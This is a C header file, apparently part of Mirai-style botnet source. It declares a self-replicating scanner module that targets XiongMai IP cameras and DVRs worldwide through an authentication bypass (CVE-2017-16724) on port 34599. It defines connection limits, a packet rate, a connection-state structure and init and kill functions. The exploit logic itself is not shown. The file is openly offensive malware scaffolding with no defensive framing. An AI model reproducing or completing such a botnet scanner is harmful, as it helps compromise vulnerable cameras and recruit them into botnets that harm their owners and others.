#ifdef SELFREP

/* ============================================================================
 * XIONGMAI SCANNER - IP Camera CVE-2017-16724 (Port 34599)
 * ============================================================================
 * Exploit: XiongMai IP camera authentication bypass
 * Targets: XM IP cameras and DVRs globally
 * Method: Binary protocol authentication bypass
 * Regions: Asia, Middle East, Africa, Latin America, Europe
 * ============================================================================ */

#pragma once

#include <stdint.h>
#include "includes.h"

#define XM_SCANNER_MAX_CONNS 128
#define XM_SCANNER_RAW_PPS 64

struct xm_scanner_connection {
    int fd;
    ipv4_t dst_addr;
    uint16_t dst_port;
    uint8_t state;
    time_t last_recv;
    char rdbuf[1024];
    int rdbuf_pos;
};

void xm_scanner_init(void);
void xm_kill(void);

#endif
